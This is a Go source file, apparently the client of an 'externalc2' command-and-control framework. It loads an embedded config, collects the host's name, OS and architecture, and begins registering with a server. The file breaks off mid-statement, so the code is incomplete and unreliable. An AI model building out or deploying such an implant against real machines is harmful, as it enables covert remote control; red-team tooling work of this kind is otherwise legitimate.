//go:build client

package main

import (
	"embed"
	"log"

	"externalc2/pkg/component"
	"externalc2/pkg/config/clientconfig"
	"externalc2/pkg/transport"
	"externalc2/pkg/utils/logging"
	"externalc2/pkg/utils/uname"
)

// embeded config
//
//go:generate cp -r ../../configs/client/client.conf ./client.conf
//go:generate cp -r ../../configs/
//go:embed *
var configFs embed.FS

// Initalize the client, read the config, set the values
func genComponentInfo() component.Component {
	var ClientComponent component.Component
	var err error
	log.SetPrefix(logging.GetLogPrefix())
	rawConfig, err := configFs.ReadFile("client.conf")
	if err != nil {
		log.Fatalln("failed to get embedded config")
	}
	// symKey, err := configFs.ReadFile("symkey")
	// if err != nil {
	// 	log.Fatalln("failed to retrieve symkey")
	// }
	componentConfig := clientconfig.ParseConfig(rawConfig)
	ClientComponent.Config = componentConfig
	ClientComponent.Manifest = makeManifest()

	return ClientComponent
}

func makeManifest() component.ComponentManifest {
	var generatedManifest component.ComponentManifest
	platInfo := uname.GetUname()
	generatedManifest.Hostname = platInfo.Uname.Nodename
	generatedManifest.Os = platInfo.Uname.Sysname
	generatedManifest.Arch = platInfo.Uname.Machine
	return generatedManifest
}

func registerServer(Component component.Component) transport.RegisteredComponent {
	var serverReg transport.RegisteredComponent
	transport, _, err := transport.PrepareTransport(&Component, []string{})
	if err != nil {
		log.Fatalln("transprot failed to initalize: ", err)
	}
	initFrame.
}
